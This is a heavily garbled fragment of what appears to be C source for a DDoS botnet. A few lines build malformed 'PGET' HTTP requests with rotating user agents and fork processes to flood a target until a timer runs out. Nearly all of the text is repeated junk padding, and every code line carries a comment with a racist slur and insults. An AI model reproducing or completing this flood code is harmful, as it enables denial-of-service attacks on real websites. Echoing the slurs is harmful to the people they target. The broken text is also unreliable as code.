IUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");// done//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    for (i = 0; i < power; i++) {//extra strings [full on top of the random one incase it gets pacthed for some mad reason]//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
        sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 2)]);//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
        if (fork()) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
            while (end > time(NULL)) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFA